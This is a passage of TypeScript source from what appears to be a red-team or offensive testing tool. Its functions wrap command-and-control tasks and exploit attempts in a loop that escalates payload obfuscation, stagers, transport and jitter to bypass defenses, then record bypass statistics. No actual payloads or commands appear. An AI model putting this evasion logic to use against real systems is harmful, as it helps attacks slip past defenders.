  }) => Promise<{ success: boolean; output?: string; error?: string }>,
  config?: Partial<OrchestratorConfig>,
): Promise<EvasionFinding> {
  const initialContext: EscalationContext = {
    command,
    transport: "https",
    sleepInterval: 30000,
    metadata: { originalCommand: command },
  };

  return runEvasionLoop(
    "c2",
    sessionTarget,
    `C2 task: ${command.substring(0, 50)}`,
    initialContext,
    async (ctx) => {
      try {
        const result = await taskFn(ctx.command || command, {
          transport: ctx.transport,
          sleepInterval: ctx.sleepInterval,
          jitter: ctx.jitter,
          pipelineProfile: ctx.pipelineProfile,
        });
        return {
          success: result.success,
          body: result.output,
          error: result.error,
        };
      } catch (err: any) {
        return { success: false, error: err.message };
      }
    },
    config,
  );
}

/**
 * Run an evasion-aware exploit execution.
 * Wraps an exploit attempt with progressive payload obfuscation escalation.
 */
export async function evasionExploit(
  target: string,
  exploitName: string,
  exploitPayload: string,
  exploitFn: (payload: string, options: {
    headers?: Record<string, string>;
    encoding?: string;
    pipelineProfile?: EvasionProfile;
    obfuscationLevel?: number;
    stager?: string;
  }) => Promise<{ success: boolean; statusCode?: number; body?: string; error?: string }>,
  config?: Partial<OrchestratorConfig>,
): Promise<EvasionFinding> {
  const initialContext: EscalationContext = {
    url: target,
    exploitPayload,
    headers: {},
    metadata: { exploitName, originalPayload: exploitPayload },
  };

  return runEvasionLoop(
    "exploit",
    target,
    `Exploit: ${exploitName}`,
    initialContext,
    async (ctx) => {
      try {
        const result = await exploitFn(ctx.exploitPayload || exploitPayload, {
          headers: ctx.headers,
          encoding: ctx.encoding,
          pipelineProfile: ctx.pipelineProfile,
          obfuscationLevel: ctx.obfuscationLevel,
          stager: ctx.stager,
        });
        return {
          success: result.success,
          statusCode: result.statusCode,
          body: result.body,
          error: result.error,
        };
      } catch (err: any) {
        return { success: false, error: err.message };
      }
    },
    config,
  );
}

// ═══════════════════════════════════════════════════════════════════════
// §7 — IN-MEMORY FINDINGS STORE
// ═══════════════════════════════════════════════════════════════════════

const findingsStore: EvasionFinding[] = [];

export function storeFinding(finding: EvasionFinding): void {
  findingsStore.push(finding);
  // Keep last 200 findings in memory
  if (findingsStore.length > 200) findingsStore.shift();
}

export function getFindings(filters?: {
  domain?: EvasionDomain;
  result?: EscalationResult;
  target?: string;
  limit?: number;
}): EvasionFinding[] {
  let results = [...findingsStore];
  if (filters?.domain) results = results.filter(f => f.domain === filters.domain);
  if (filters?.result) results = results.filter(f => f.finalResult === filters.result);
  if (filters?.target) results = results.filter(f => f.target.includes(filters.target!));
  results.sort((a, b) => b.completedAt - a.completedAt);
  return results.slice(0, filters?.limit || 50);
}

export function getFindingById(id: string): EvasionFinding | undefined {
  return findingsStore.find(f => f.id === id);
}

export function getOrchestratorStats(): {
  totalFindings: number;
  byDomain: Record<EvasionDomain, number>;
  byResult: Record<EscalationResult, number>;
  averageEscalationDepth: number;
  averageBypassRate: number;
  topDefenses: { defense: string; count: number }[];
  topBypassTechniques: { technique: string; count: number }[];
} {
  const byDomain: Record<EvasionDomain, number> = { scanning: 0, c2: 0, exploit: 0 };
  const byResult: Record<EscalationResult, number> = { bypassed: 0, blocked: 0, partial: 0, error: 0 };
  const defenseCount = new Map<string, number>();
  const bypassTechCount = new Map<string, number>();
  let totalDepth = 0;
  let totalBypassRate = 0;

  for (const f of findingsStore) {
    byDomain[f.domain]++;
    byResult[f.finalResult]++;
    totalDepth += f.evasionScorecard.escalationDepth;
    totalBypassRate += f.evasionScorecard.bypassRate;
    for (const d of f.defensesDetected) {
      defenseCount.set(d, (defenseCount.get(d) || 0) + 1);
    }
    if (f.successfulTechnique && f.successfulTechnique.id !== "none") {
      bypassTechCount.set(f.successfulTechnique.name, (bypassTechCount.get(f.successfulTechnique.name) || 0) + 1);
    }
  }

  return {
    totalFindings: findingsStore.length,
    byDomain,
    byResult,
    averageEscalationDepth: findingsStore.length > 0 ? Math.round((totalDepth / findingsStore.length) * 10) / 10 : 0,
    averageBypassRate: findingsStore.length > 0 ? Math.round(totalBypassRate / findingsStore.length) : 0,
    topDefenses: [...defenseCount.entries()]
      .map(([defense, count]) => ({ defense, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 10),
    topBypassTechniques: [...bypassTechCount.entries()]
      .map(([technique, count]) => ({ technique, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 10),
  };
}
